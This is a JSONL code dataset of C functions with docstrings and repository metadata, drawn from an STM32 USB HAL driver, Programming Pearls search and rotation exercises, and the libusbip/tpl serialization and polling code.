{"docstring": "/**\n  * @brief  USB_EPSetStall : set a stall condition over an EP\n  * @param  USBx : Selected device\n  * @param  ep: pointer to endpoint structure   \n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef USB_EPSetStall(USB_OTG_GlobalTypeDef *USBx , USB_OTG_EPTypeDef *ep)", "code": "{\n  if (ep->is_in == 1)\n  {\n    if (((USBx_INEP(ep->num)->DIEPCTL) & USB_OTG_DIEPCTL_EPENA) == 0)\n    {\n      USBx_INEP(ep->num)->DIEPCTL &= ~(USB_OTG_DIEPCTL_EPDIS); \n    } \n    USBx_INEP(ep->num)->DIEPCTL |= USB_OTG_DIEPCTL_STALL;\n  }\n  else\n  {\n    if (((USBx_OUTEP(ep->num)->DOEPCTL) & USB_OTG_DOEPCTL_EPENA) == 0)\n    {\n      USBx_OUTEP(ep->num)->DOEPCTL &= ~(USB_OTG_DOEPCTL_EPDIS); \n    } \n    USBx_OUTEP(ep->num)->DOEPCTL |= USB_OTG_DOEPCTL_STALL;\n  }\n  return HAL_OK;\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_ll_usb.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/**\n  * @brief Disables the Backup Regulator.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PWREx_DisableBkUpReg(void)", "code": "{\n  uint32_t tickstart = 0;\n\n  *(__IO uint32_t *) CSR_BRE_BB = (uint32_t)DISABLE;\n\n  /* Get tick */\n  tickstart = HAL_GetTick();\n\n  /* Wait till Backup regulator ready flag is set */  \n  while(__HAL_PWR_GET_FLAG(PWR_FLAG_BRR) != RESET)\n  {\n    if((HAL_GetTick() - tickstart ) > PWR_BKPREG_TIMEOUT_VALUE)\n    {\n      return HAL_TIMEOUT;\n    } \n  }\n  return HAL_OK;\n}", "path": "Project\\HAL_Driver\\Src\\stm32f4xx_hal_pwr_ex.c", "repo_name": "mori-br/STM32F4HUB", "stars": 64, "license": "mit", "language": "c", "size": 732}
{"docstring": "/* Main */\n", "func_signal": "int main()", "code": "{\n    testrot();\n    //timedriver();\n    return 0;\n}", "path": "part-1\\column-2\\rotate.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Alg 2: Make binarysearch1 more c-ish */\n", "func_signal": "int binarysearch2(DataType t)", "code": "{\tint l, u, m;\n\tl = 0;\n\tu = n-1;\n\twhile (l <= u) {\n\t\tm = (l + u) / 2;\n\t\tif (x[m] < t)\n\t\t\tl = m+1;\n\t\telse if (x[m] == t)\n\t\t\treturn m;\n\t\telse /* x[m] > t */\n\t\t\tu = m-1;\n\t}\n\treturn -1;\n}", "path": "part-1\\column-5\\search.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Scaffolding to probe one algorithm */\n", "func_signal": "void probe1()", "code": "{\tint i;\n\tDataType t;\n\twhile (scanf(\"%d %d\", &n, &t) != EOF) {\n\t\tfor (i = 0; i < n; i++)\n\t\t\tx[i] = 10*i;\n\t\tprintf(\" %d\\n\", binarysearch9(t));\n\t}\n}", "path": "part-1\\column-5\\search.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Alg 3: From PP, Col 8 */\n", "func_signal": "int binarysearch3(DataType t)", "code": "{\tint l, u, m;\n\tl = -1;\n\tu = n;\n\twhile (l+1 != u) {\n\t\tm = (l + u) / 2;\n\t\tif (x[m] < t)\n\t\t\tl = m;\n\t\telse\n\t\t\tu = m;\n\t}\n\tif (u >= n || x[u] != t)\n\t\treturn -1;\n\treturn u;\n}", "path": "part-2\\column-9\\search.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Alg 21: Simple sequential search */\n", "func_signal": "int seqsearch1(DataType t)", "code": "{\tint i;\n\tfor (i = 0; i < n; i++)\n\t\tif (x[i] == t)\n\t\t\treturn i;\n\treturn -1;\n}", "path": "part-2\\column-9\\search.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Alg 9: Buggy, from Programming Pearls, Column 5 */\n", "func_signal": "int sorted()", "code": "{   int i;\n    for (i = 0; i < n-1; i++)\n        if (x[i] > x[i+1])\n            return 0;\n    return 1;\n}", "path": "part-1\\column-5\\search.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/*\n * Think of it like a pack of sorted pack of cards.\n *\n * Pick a random card out of the deck, and replace with the first card of the\n * deck.\n *\n * Continue until you have k cards.\n *\n * Starting with:\n *\n *   x[i] = i; for [0,n]\n *\n * Generate a random number in the range r=[a=[0,n],n]\n *\n * 0...a......n\n *      ^^^^^^\n *\n * Swap x[r] with x[a].\n *\n * i.e. guaranteed to pick random unused number.\n *\n */\n", "func_signal": "uint32_t randint (uint32_t a, uint32_t b)", "code": "{\n    uint32_t range;\n    uint32_t r, max;\n\n    /*\n     * We want a number in the range a..b.\n     */\n    range = b - a + 1;\n\n    /*\n     * Discard top random numbers for uniform distribution in this range, by\n     * removing the remainder.\n     */\n    max = RAND_MAX;\n    if (range < RAND_MAX) {\n\tmax -= (RAND_MAX % range);\n    }\n\n    do {\n\tr = rand();\n    } while (r >= max);\n\n\n    // if (RAND_MAX * RAND_MAX < INT_MAX)\n\n//    if (b > RAND_MAX) {\n//\tr += RAND_MAX * rand();\n//    }\n\n    r %= range;\n\n    return (a + r);\n}", "path": "part-1\\column-1\\bitsortgen.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Alg 1: Rotate by reversal */\n", "func_signal": "void reverse(int i, int j)", "code": "{\n    int t;\n    while (i < j) {\n\tt = x[i]; x[i] = x[j]; x[j] = t;\n\ti++;\n\tj--;\n    }\n}", "path": "part-2\\column-9\\rotate.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Alg 21: Simple sequential search */\n", "func_signal": "int seqsearch1(DataType t)", "code": "{\tint i;\n\tfor (i = 0; i < n; i++)\n\t\tif (x[i] == t)\n\t\t\treturn i;\n\treturn -1;\n}", "path": "part-1\\column-5\\search.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Main */\n", "func_signal": "int main()", "code": "{\t/* probe1(); */\n\t/* test(25); */\n\ttimedriver();\n\treturn 0;\n}", "path": "part-1\\column-5\\search.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Alg 4: From PP, Col 9 */\n", "func_signal": "int binarysearch4(DataType t)", "code": "{\tint l, p;\n\tif (n != 1000)\n\t\treturn binarysearch3(t);\n\tl = -1;\n\tif (x[511]   < t) l = 1000 - 512;\n\tif (x[l+256] < t) l += 256;\n\tif (x[l+128] < t) l += 128;\n\tif (x[l+64 ] < t) l += 64;\n\tif (x[l+32 ] < t) l += 32;\n\tif (x[l+16 ] < t) l += 16;\n\tif (x[l+8  ] < t) l += 8;\n\tif (x[l+4  ] < t) l += 4;\n\tif (x[l+2  ] < t) l += 2;\n\tif (x[l+1  ] < t) l += 1;\n\tp = l+1;\n\tif (p >= n || x[p] != t)\n\t\treturn -1;\n\treturn p;\n}", "path": "part-1\\column-5\\search.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Alg 2: Juggling (dolphin) rotation */\n", "func_signal": "int gcd(int i, int j)", "code": "{\n    int t;\n    while (i != 0) {\n\tif (j >= i)\n\t    j -= i;\n\telse {\n\t    t = i; i = j; j = t;\n\t}\n    }\n    return j;\n}", "path": "part-2\\column-9\\rotate.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Scaffolding to probe one algorithm */\n", "func_signal": "void probe1()", "code": "{\tint i;\n\tDataType t;\n\twhile (scanf(\"%d %d\", &n, &t) != EOF) {\n\t\tfor (i = 0; i < n; i++)\n\t\t\tx[i] = 10*i;\n\t\tprintf(\" %d\\n\", binarysearch9(t));\n\t}\n}", "path": "part-2\\column-9\\search.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Timing */\n", "func_signal": "void timedriver()", "code": "{\n    int i, algnum, numtests, start, clicks;\n    while (scanf(\"%d %d %d %d\", &algnum, &numtests, &n, &rotdist) != EOF) {\n\tinitx();\n\tstart = clock();\n\tfor (i = 0; i < numtests; i++) {\n\t    if (algnum == 1)\n\t\trevrot(rotdist, n);\n\t    else if (algnum == 2)\n\t\tjugglerot(rotdist, n);\n\t    else if (algnum == 22)\n\t\tjugglerot2(rotdist, n);\n\t    else if (algnum == 3)\n\t\tgcdrot(rotdist, n);\n\t    else if (algnum == 4)\n\t\tslide(rotdist, n);\n\t}\n\tclicks = clock() - start;\n\tprintf(\"%d\\t%d\\t%d\\t%d\\t%d\\t%g\\n\",\n\t       algnum, numtests, n, rotdist, clicks,\n\t       1e9*clicks/((float) CLOCKS_PER_SEC*n*numtests));\n    }\n}", "path": "part-2\\column-9\\rotate.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Alg 3: From PP, Col 8 */\n", "func_signal": "int binarysearch3(DataType t)", "code": "{\tint l, u, m;\n\tl = -1;\n\tu = n;\n\twhile (l+1 != u) {\n\t\tm = (l + u) / 2;\n\t\tif (x[m] < t)\n\t\t\tl = m;\n\t\telse\n\t\t\tu = m;\n\t}\n\tif (u >= n || x[u] != t)\n\t\treturn -1;\n\treturn u;\n}", "path": "part-1\\column-5\\search.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Alg 9: Buggy, from Programming Pearls, Column 5 */\n", "func_signal": "int sorted()", "code": "{   int i;\n    for (i = 0; i < n-1; i++)\n        if (x[i] > x[i+1])\n            return 0;\n    return 1;\n}", "path": "part-2\\column-9\\search.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Alg 23: Faster sequential search: loop unrolling */\n", "func_signal": "int seqsearch3(DataType t)", "code": "{\tint i;\n\tDataType hold = x[n];\n\tx[n] = t;\n\tfor (i = 0; ; i+=8) {\n\t\tif (x[i] == t)   {          break; }\n\t\tif (x[i+1] == t) { i += 1; break; }\n\t\tif (x[i+2] == t) { i += 2; break; }\n\t\tif (x[i+3] == t) { i += 3; break; }\n\t\tif (x[i+4] == t) { i += 4; break; }\n\t\tif (x[i+5] == t) { i += 5; break; }\n\t\tif (x[i+6] == t) { i += 6; break; }\n\t\tif (x[i+7] == t) { i += 7; break; }\n\t}\n\tx[n] = hold;\n\tif (i == n)\n\t\treturn -1;\n\telse\n\t\treturn i;\n}", "path": "part-1\\column-5\\search.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Alg 1: Rotate by reversal */\n", "func_signal": "void reverse(int i, int j)", "code": "{\n    int t;\n    while (i < j) {\n\tt = x[i]; x[i] = x[j]; x[j] = t;\n\ti++;\n\tj--;\n    }\n}", "path": "part-1\\column-2\\rotate.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Main */\n", "func_signal": "int main()", "code": "{\n    testrot();\n    //timedriver();\n    return 0;\n}", "path": "part-2\\column-9\\rotate.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "/* Alg 22: Faster sequential search: Sentinel */\n", "func_signal": "int seqsearch2(DataType t)", "code": "{\tint i;\n\tDataType hold = x[n];\n\tx[n] = t;\n\tfor (i = 0; ; i++)\n\t\tif (x[i] == t)\n\t\t\tbreak;\n\tx[n] = hold;\n\tif (i == n)\n\t\treturn -1;\n\telse\n\t\treturn i;\n}", "path": "part-2\\column-9\\search.c", "repo_name": "alxn/ppearls", "stars": 95, "license": "None", "language": "c", "size": 144}
{"docstring": "// Init\n", "func_signal": "void init_polling(void)", "code": "{\n\tint i;\n\n\twhile (InterlockedExchange((LONG *)&compat_spinlock, 1) == 1) {\n\t\tSleepEx(0, TRUE);\n\t}\n\tif (!is_polling_set) {\n\t\tpCancelIoEx = (BOOL (__stdcall *)(HANDLE,LPOVERLAPPED))\n\t\t\tGetProcAddress(GetModuleHandle(\"KERNEL32\"), \"CancelIoEx\");\n\t\tusbi_dbg(\"Will use CancelIo%s for I/O cancellation\",\n\t\t\tCancelIoEx_Available?\"Ex\":\"\");\n\t\tfor (i=0; i<MAX_FDS; i++) {\n\t\t\tpoll_fd[i] = INVALID_WINFD;\n\t\t\t_poll_fd[i].original_handle = INVALID_HANDLE_VALUE;\n\t\t\t_poll_fd[i].thread_id = 0;\n\t\t\tInitializeCriticalSection(&_poll_fd[i].mutex);\n\t\t}\n#if defined(DYNAMIC_FDS)\n\t\t// We need to create an update event so that poll is warned when there\n\t\t// are new/deleted fds during a timeout wait operation\n\t\tfd_update = CreateEvent(NULL, TRUE, FALSE, NULL);\n\t\tif (fd_update == NULL) {\n\t\t\tusbi_err(NULL, \"unable to create update event\");\n\t\t}\n\t\tusbi_mutex_init(&new_fd_mutex, NULL);\n\t\tnb_new_fds = 0;\n#endif\n\t\tis_polling_set = TRUE;\n\t}\n\tcompat_spinlock = 0;\n}", "path": "include\\libusb\\os\\poll_windows.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/* Used by select()-driven apps which want to gather tpl images piecemeal */\n/* the file descriptor must be non-blocking for this functino to work. */\n", "func_signal": "static int tpl_gather_nonblocking( int fd, tpl_gather_t **gs, tpl_gather_cb *cb, void *data)", "code": "{\n    char buf[TPL_GATHER_BUFLEN], *img, *tpl;\n    int rc, keep_looping, cbrc=0;\n    size_t catlen;\n    uint32_t tpllen;\n\n    while (1) {\n        rc = read(fd,buf,TPL_GATHER_BUFLEN);\n        if (rc == -1) {\n            if (errno == EINTR) continue;  /* got signal during read, ignore */\n            if (errno == EAGAIN) return 1; /* nothing to read right now */\n            else {\n                tpl_hook.oops(\"tpl_gather failed: %s\\n\", strerror(errno));\n                if (*gs) {\n                    tpl_hook.free((*gs)->img);\n                    tpl_hook.free(*gs);\n                    *gs = NULL;\n                }\n                return -1;                 /* error, caller should close fd  */\n            }\n        } else if (rc == 0) {\n            if (*gs) {\n                tpl_hook.oops(\"tpl_gather: partial tpl image precedes EOF\\n\");\n                tpl_hook.free((*gs)->img);\n                tpl_hook.free(*gs);\n                *gs = NULL;\n            }\n            return 0;                      /* EOF, caller should close fd */\n        } else {\n            /* concatenate any partial tpl from last read with new buffer */\n            if (*gs) {\n                catlen = (*gs)->len + rc;\n                if (tpl_hook.gather_max > 0 && \n                    catlen > tpl_hook.gather_max) {\n                    tpl_hook.free( (*gs)->img );\n                    tpl_hook.free( (*gs) );\n                    *gs = NULL;\n                    tpl_hook.oops(\"tpl exceeds max length %d\\n\", \n                        tpl_hook.gather_max);\n                    return -2;              /* error, caller should close fd */\n                }\n                if ( (img = tpl_hook.realloc((*gs)->img, catlen)) == NULL) {\n                    fatal_oom();\n                }\n                memcpy(img + (*gs)->len, buf, rc);\n                tpl_hook.free(*gs);\n                *gs = NULL;\n            } else {\n                img = buf;\n                catlen = rc;\n            }\n            /* isolate any full tpl(s) in img and invoke cb for each */\n            tpl = img;\n            keep_looping = (tpl+8 < img+catlen) ? 1 : 0;\n            while (keep_looping) {\n                if (strncmp(\"tpl\", tpl, 3) != 0) {\n                    tpl_hook.oops(\"tpl prefix invalid\\n\");\n                    if (img != buf) tpl_hook.free(img);\n                    tpl_hook.free(*gs);\n                    *gs = NULL;\n                    return -3; /* error, caller should close fd */\n                }\n                memcpy(&tpllen,&tpl[4],4);\n                if (tpl_needs_endian_swap(tpl)) tpl_byteswap(&tpllen,4);\n                if (tpl+tpllen <= img+catlen) {\n                    cbrc = (cb)(tpl,tpllen,data);  /* invoke cb for tpl image */\n                    tpl += tpllen;                 /* point to next tpl image */\n                    if (cbrc < 0) keep_looping = 0;\n                    else keep_looping = (tpl+8 < img+catlen) ? 1 : 0;\n                } else keep_looping=0;\n            } \n            /* check if app callback requested closure of tpl source */\n            if (cbrc < 0) {\n                tpl_hook.oops(\"tpl_fd_gather aborted by app callback\\n\");\n                if (img != buf) tpl_hook.free(img);\n                if (*gs) tpl_hook.free(*gs);\n                *gs = NULL;\n                return -4;\n            }\n            /* store any leftover, partial tpl fragment for next read */\n            if (tpl == img && img != buf) {  \n                /* consumed nothing from img!=buf */\n                if ( (*gs = tpl_hook.malloc(sizeof(tpl_gather_t))) == NULL ) {\n                    fatal_oom();\n                }\n                (*gs)->img = tpl;\n                (*gs)->len = catlen;\n            } else if (tpl < img+catlen) {  \n                /* consumed 1+ tpl(s) from img!=buf or 0 from img==buf */\n                if ( (*gs = tpl_hook.malloc(sizeof(tpl_gather_t))) == NULL ) {\n                    fatal_oom();\n                }\n                if ( ((*gs)->img = tpl_hook.malloc(img+catlen - tpl)) == NULL ) {\n                    fatal_oom();\n                }\n                (*gs)->len = img+catlen - tpl;\n                memcpy( (*gs)->img, tpl, img+catlen - tpl);\n                /* free partially consumed concat buffer if used */\n                if (img != buf) tpl_hook.free(img); \n            } else {                        /* tpl(s) fully consumed */\n                /* free consumed concat buffer if used */\n                if (img != buf) tpl_hook.free(img); \n            }\n        }\n    } \n}", "path": "include\\tpl\\tpl.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/* tpl_jot(TPL_FILE, \"file.tpl\", \"si\", &s, &i); */\n/* tpl_jot(TPL_MEM, &buf, &sz, \"si\", &s, &i); */\n/* tpl_jot(TPL_FD, fd, \"si\", &s, &i); */\n", "func_signal": "TPL_API int tpl_jot(int mode, ...)", "code": "{\n    va_list ap;\n    char *filename, *fmt;\n    size_t *sz;\n    int fd, rc=0;\n    void **buf;\n    tpl_node *tn;\n\n    va_start(ap,mode);\n    if (mode & TPL_FILE) {\n      filename = va_arg(ap,char*);\n      fmt = va_arg(ap,char*);\n      tn = tpl_map_va(fmt, ap);\n      if (tn == NULL) { rc=-1; goto fail;}\n      tpl_pack(tn, 0);\n      rc = tpl_dump(tn, TPL_FILE, filename);\n      tpl_free(tn);\n    } else if (mode & TPL_MEM) {\n      buf = va_arg(ap,void*);\n      sz = va_arg(ap,size_t*);\n      fmt = va_arg(ap,char*);\n      tn = tpl_map_va(fmt,ap);\n      if (tn == NULL) { rc=-1; goto fail;}\n      tpl_pack(tn,0);\n      rc = tpl_dump(tn, TPL_MEM, buf, sz);\n      tpl_free(tn);\n    } else if (mode & TPL_FD) {\n      fd = va_arg(ap,int);\n      fmt = va_arg(ap,char*);\n      tn = tpl_map_va(fmt,ap);\n      if (tn == NULL) { rc=-1; goto fail;}\n      tpl_pack(tn,0);\n      rc = tpl_dump(tn, TPL_FD, fd);\n      tpl_free(tn);\n    } else {\n      tpl_hook.fatal(\"invalid tpl_jot mode\\n\");\n    }\n\nfail:\n    va_end(ap);\n    return rc;\n}", "path": "include\\tpl\\tpl.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/* figure the serialization output size needed for tpl whose root is n*/\n", "func_signal": "static size_t tpl_ser_osz(tpl_node *n)", "code": "{\n    tpl_node *c, *np;\n    size_t sz, itermax;\n    tpl_bin *binp;\n    char *strp;\n    tpl_pound_data *pd;\n    int i;\n\n    /* handle the root node ONLY (subtree's ser_osz have been bubbled-up) */\n    if (n->type != TPL_TYPE_ROOT) {\n        tpl_hook.fatal(\"internal error: tpl_ser_osz on non-root node\\n\");\n    }\n\n    sz = n->ser_osz;    /* start with fixed overhead, already stored */\n    c=n->children;\n    while (c) {\n        switch (c->type) {\n            case TPL_TYPE_BYTE:\n            case TPL_TYPE_DOUBLE:\n            case TPL_TYPE_INT32:\n            case TPL_TYPE_UINT32:\n            case TPL_TYPE_INT64:\n            case TPL_TYPE_UINT64:\n            case TPL_TYPE_INT16:\n            case TPL_TYPE_UINT16:\n                sz += tpl_types[c->type].sz * c->num;\n                break;\n            case TPL_TYPE_BIN:\n                sz += sizeof(uint32_t);  /* binary buf len */\n                memcpy(&binp,c->data,sizeof(tpl_bin*)); /* cp to aligned */\n                sz += binp->sz; \n                break;\n            case TPL_TYPE_STR:\n                for(i=0; i < c->num; i++) {\n                  sz += sizeof(uint32_t);  /* string len */\n                  memcpy(&strp,&((char**)c->data)[i],sizeof(char*)); /* cp to aligned */\n                  sz += strp ? strlen(strp) : 0;\n                }\n                break;\n            case TPL_TYPE_ARY:\n                sz += sizeof(uint32_t);  /* array len */\n                sz += c->ser_osz;        /* bubbled-up child array ser_osz */\n                break;\n            case TPL_TYPE_POUND:\n                /* iterate over the preceding nodes */\n                itermax = c->num;\n                pd = (tpl_pound_data*)c->data;\n                if (++(pd->iternum) < itermax) {\n                  for(np=pd->iter_start_node; np != c; np = np->next) {\n                     np->data = (char*)(np->data) + \n                                (tpl_types[np->type].sz * np->num);\n                  }\n                  c = pd->iter_start_node;\n                  continue;\n                } else { /* loop complete. */\n                  pd->iternum = 0;\n                  for(np=pd->iter_start_node; np != c; np = np->next) {\n                     np->data = (char*)(np->data) - ((itermax-1) * \n                                                     tpl_types[np->type].sz * \n                                                     np->num);\n                  }\n                }\n                break;\n            default:\n                tpl_hook.fatal(\"unsupported format character\\n\");\n                break;\n        }\n        c=c->next;\n    }\n    return sz;\n}", "path": "include\\tpl\\tpl.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/*\n * algorithm for sanity-checking a tpl image:\n * scan the tpl whilst not exceeding the buffer size (bufsz) ,\n * formulating a calculated (expected) size of the tpl based\n * on walking its data. When calcsize has been calculated it\n * should exactly match the buffer size (bufsz) and the internal\n * recorded size (intlsz)\n */\n", "func_signal": "static int tpl_sanity(tpl_node *r, int excess_ok)", "code": "{\n    uint32_t intlsz;\n    int found_nul=0,rc, octothorpes=0, num_fxlens, *fxlens, flen;\n    void *d, *dv;\n    char intlflags, *fmt, c, *mapfmt;\n    size_t bufsz, serlen;\n\n    d = ((tpl_root_data*)(r->data))->mmap.text;\n    bufsz = ((tpl_root_data*)(r->data))->mmap.text_sz;\n\n    dv = d;\n    if (bufsz < (4 + sizeof(uint32_t) + 1)) return ERR_NOT_MINSIZE; /* min sz: magic+flags+len+nul */\n    if (memcmp(dv,TPL_MAGIC, 3) != 0) return ERR_MAGIC_MISMATCH; /* missing tpl magic prefix */\n    if (tpl_needs_endian_swap(dv)) ((tpl_root_data*)(r->data))->flags |= TPL_XENDIAN;\n    dv = (void*)((uintptr_t)dv + 3);\n    memcpy(&intlflags,dv,sizeof(char));  /* extract flags */\n    if (intlflags & ~TPL_SUPPORTED_BITFLAGS) return ERR_UNSUPPORTED_FLAGS;\n    /* TPL1.3 stores strings with a \"length+1\" prefix to discern NULL strings from\n       empty strings from non-empty strings; TPL1.2 only handled the latter two. \n       So we need to be mindful of which string format we're reading from. */\n    if (!(intlflags & TPL_FL_NULLSTRINGS)) {\n      ((tpl_root_data*)(r->data))->flags |= TPL_OLD_STRING_FMT;\n    }\n    dv = (void*)((uintptr_t)dv + 1);\n    memcpy(&intlsz,dv,sizeof(uint32_t));  /* extract internal size */\n    if (((tpl_root_data*)(r->data))->flags & TPL_XENDIAN) tpl_byteswap(&intlsz, sizeof(uint32_t));\n    if (!excess_ok && (intlsz != bufsz)) return ERR_INCONSISTENT_SZ;  /* inconsisent buffer/internal size */\n    dv = (void*)((uintptr_t)dv + sizeof(uint32_t));\n\n    /* dv points to the start of the format string. Look for nul w/in buf sz */\n    fmt = (char*)dv;\n    while ((uintptr_t)dv-(uintptr_t)d < bufsz && !found_nul) {\n        if ( (c = *(char*)dv) != '\\0') {\n            if (strchr(tpl_fmt_chars,c) == NULL) \n               return ERR_FMT_INVALID;  /* invalid char in format string */\n            if ( (c = *(char*)dv) == '#') octothorpes++;\n            dv = (void*)((uintptr_t)dv + 1);\n        }\n        else found_nul = 1;\n    }\n    if (!found_nul) return ERR_FMT_MISSING_NUL;  /* runaway format string */\n    dv = (void*)((uintptr_t)dv + 1);   /* advance to octothorpe lengths buffer */\n    \n    /* compare the map format to the format of this tpl image */\n    mapfmt = tpl_fmt(r);\n    rc = strcmp(mapfmt,fmt);\n    if (rc != 0) return ERR_FMT_MISMATCH; \n\n    /* compare octothorpe lengths in image to the mapped values */\n    if ((((uintptr_t)dv + (octothorpes * 4)) - (uintptr_t)d) > bufsz) return ERR_INCONSISTENT_SZ4;\n    fxlens = tpl_fxlens(r,&num_fxlens);  /* mapped fxlens */\n    while(num_fxlens--) {\n        memcpy(&flen,dv,sizeof(uint32_t)); /* stored flen */\n        if (((tpl_root_data*)(r->data))->flags & TPL_XENDIAN) tpl_byteswap(&flen, sizeof(uint32_t));\n        if (flen != *fxlens) return ERR_FLEN_MISMATCH;\n        dv = (void*)((uintptr_t)dv + sizeof(uint32_t));\n        fxlens++;\n    }\n\n    /* dv now points to beginning of data */\n    rc = tpl_serlen(r,r,dv,&serlen);  /* get computed serlen of data part */\n    if (rc == -1) return ERR_INCONSISTENT_SZ2; /* internal inconsistency in tpl image */\n    serlen += ((uintptr_t)dv - (uintptr_t)d);   /* add back serlen of preamble part */\n    if (excess_ok && (bufsz < serlen)) return ERR_INCONSISTENT_SZ3;  \n    if (!excess_ok && (serlen != bufsz)) return ERR_INCONSISTENT_SZ3;  /* buffer/internal sz exceeds serlen */\n    return 0;\n}", "path": "include\\tpl\\tpl.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
{"docstring": "/* determine (by walking) byte length of serialized r/A node at address dv \n * returns 0 on success, or -1 if the tpl isn't trustworthy (fails consistency)\n */\n", "func_signal": "static int tpl_serlen(tpl_node *r, tpl_node *n, void *dv, size_t *serlen)", "code": "{\n    uint32_t slen;\n    int num,fidx;\n    tpl_node *c;\n    size_t len=0, alen, buf_past, itermax;\n    tpl_pound_data *pd;\n\n    buf_past = ((uintptr_t)((tpl_root_data*)(r->data))->mmap.text + \n                      ((tpl_root_data*)(r->data))->mmap.text_sz);\n\n    if (n->type == TPL_TYPE_ROOT) num = 1;\n    else if (n->type == TPL_TYPE_ARY) {\n        if ((uintptr_t)dv + sizeof(uint32_t) > buf_past) return -1;\n        memcpy(&num,dv,sizeof(uint32_t));\n        if (((tpl_root_data*)(r->data))->flags & TPL_XENDIAN)\n             tpl_byteswap(&num, sizeof(uint32_t));\n        dv = (void*)((uintptr_t)dv + sizeof(uint32_t));\n        len += sizeof(uint32_t);\n    } else tpl_hook.fatal(\"internal error in tpl_serlen\\n\");\n\n    while (num-- > 0) {\n        c=n->children; \n        while (c) {\n            switch (c->type) {\n                case TPL_TYPE_BYTE:\n                case TPL_TYPE_DOUBLE:\n                case TPL_TYPE_INT32:\n                case TPL_TYPE_UINT32:\n                case TPL_TYPE_INT64:\n                case TPL_TYPE_UINT64:\n                case TPL_TYPE_INT16:\n                case TPL_TYPE_UINT16:\n                    for(fidx=0; fidx < c->num; fidx++) {  /* octothorpe support */\n                        if ((uintptr_t)dv + tpl_types[c->type].sz > buf_past) return -1;\n                        dv = (void*)((uintptr_t)dv + tpl_types[c->type].sz);\n                        len += tpl_types[c->type].sz;\n                    }\n                    break;\n                case TPL_TYPE_BIN:\n                    len += sizeof(uint32_t);\n                    if ((uintptr_t)dv + sizeof(uint32_t) > buf_past) return -1;\n                    memcpy(&slen,dv,sizeof(uint32_t));\n                    if (((tpl_root_data*)(r->data))->flags & TPL_XENDIAN)\n                        tpl_byteswap(&slen, sizeof(uint32_t));\n                    len += slen;\n                    dv = (void*)((uintptr_t)dv + sizeof(uint32_t));\n                    if ((uintptr_t)dv + slen > buf_past) return -1;\n                    dv = (void*)((uintptr_t)dv + slen);\n                    break;\n                case TPL_TYPE_STR:\n                    for(fidx=0; fidx < c->num; fidx++) {  /* octothorpe support */\n                      len += sizeof(uint32_t);\n                      if ((uintptr_t)dv + sizeof(uint32_t) > buf_past) return -1;\n                      memcpy(&slen,dv,sizeof(uint32_t));\n                      if (((tpl_root_data*)(r->data))->flags & TPL_XENDIAN)\n                          tpl_byteswap(&slen, sizeof(uint32_t));\n                      if (!(((tpl_root_data*)(r->data))->flags & TPL_OLD_STRING_FMT))\n                         slen = (slen>1) ? (slen-1) : 0;\n                      len += slen;\n                      dv = (void*)((uintptr_t)dv + sizeof(uint32_t));\n                      if ((uintptr_t)dv + slen > buf_past) return -1;\n                      dv = (void*)((uintptr_t)dv + slen);\n                    }\n                    break;\n                case TPL_TYPE_ARY:\n                    if ( tpl_serlen(r,c,dv, &alen) == -1) return -1;\n                    dv = (void*)((uintptr_t)dv + alen);\n                    len += alen;\n                    break;\n                case TPL_TYPE_POUND:\n                    /* iterate over the preceding nodes */\n                    itermax = c->num;\n                    pd = (tpl_pound_data*)c->data;\n                    if (++(pd->iternum) < itermax) {\n                      c = pd->iter_start_node;\n                      continue;\n                    } else { /* loop complete. */\n                      pd->iternum = 0;\n                    }\n                    break;\n                default:\n                    tpl_hook.fatal(\"unsupported format character\\n\");\n                    break;\n            }\n            c=c->next;\n        }\n    }\n    *serlen = len;\n    return 0;\n}", "path": "include\\tpl\\tpl.c", "repo_name": "forensix/libusbip", "stars": 99, "license": "None", "language": "c", "size": 281}
